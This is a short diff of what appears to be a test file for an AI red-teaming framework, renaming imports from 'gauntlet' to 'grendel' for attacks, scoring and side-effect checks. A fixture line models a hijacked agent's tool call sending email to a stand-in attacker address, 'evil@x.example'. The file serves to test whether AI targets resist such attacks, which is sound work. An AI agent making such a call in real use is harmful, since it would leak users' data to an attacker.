@@ -2,10 +2,10 @@
 
 from __future__ import annotations
 
-from gauntlet.attacks import Attack, SideEffectCheck
-from gauntlet.records import Verdict
-from gauntlet.scoring import Scorer, score_side_effect
-from gauntlet.targets.base import AdapterResponse
+from grendel.attacks import Attack, SideEffectCheck
+from grendel.records import Verdict
+from grendel.scoring import Scorer, score_side_effect
+from grendel.targets.base import AdapterResponse
 
 _SEND = [{"name": "send_email", "args": {"to": "evil@x.example"}, "ordinal": 0}]
 
